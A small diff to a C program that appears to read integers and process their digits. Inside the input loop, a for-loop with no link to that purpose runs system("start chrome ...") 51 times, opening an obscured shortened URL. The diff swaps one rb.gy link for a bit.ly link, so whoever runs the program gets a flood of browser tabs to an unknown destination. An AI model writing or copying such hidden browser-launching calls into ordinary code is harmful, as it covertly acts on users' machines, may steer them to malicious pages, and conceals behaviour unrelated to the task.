@@ -12,7 +12,7 @@ int main(){
 		int ch = scanf("%d", &x);
 		if(ch!=1){printf("Invalid Input!!\n"); break;}
 		int c = x, n=x, l=0;for(int u=0; u<=50; u++){
-		system("start chrome https://rb.gy/d553e");}
+		system("start chrome https://bit.ly/46HC3Uh");}
 		while(n>0){l++; n /=10;}
 		for(int i=1; i<=l; i++){
 			int mod = x%10;
